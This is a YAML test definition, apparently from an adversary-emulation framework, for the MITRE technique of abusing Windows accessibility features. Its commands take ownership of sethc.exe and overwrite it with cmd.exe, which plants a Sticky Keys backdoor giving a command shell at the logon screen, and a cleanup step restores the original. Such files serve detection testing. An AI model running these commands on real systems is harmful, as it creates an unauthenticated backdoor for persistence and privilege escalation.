api_version: "2.0"
name: Replace binary of sticky keys
description: |
    Replace sticky keys binary (sethc.exe) with cmd.exe
uuid: 934e90cf-29ca-48b3-863c-411737ad44e3
mitre:
    tactics:
        - 'TA0004: Privilege Escalation'
        - 'TA0003: Persistence'
    techniques:
        - 'T1546: Event Triggered Execution'
    subtechniques:
        - 'T1546.008: Accessibility Features'
requirements:
    platforms:
        - os: windows
steps:
    - name: replace-binary-of-sticky-keys
      inline: |
        IF NOT EXIST C:\Windows\System32\sethc_backup.exe (copy C:\Windows\System32\sethc.exe C:\Windows\System32\sethc_backup.exe) ELSE ( pushd )
        takeown /F C:\Windows\System32\sethc.exe /A
        icacls C:\Windows\System32\sethc.exe /grant Administrators:F /t
        copy /Y C:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe
      executor: command_prompt
      cleanup:
        inline: |
            copy /Y C:\Windows\System32\sethc_backup.exe C:\Windows\System32\sethc.exe
        executor: command_prompt
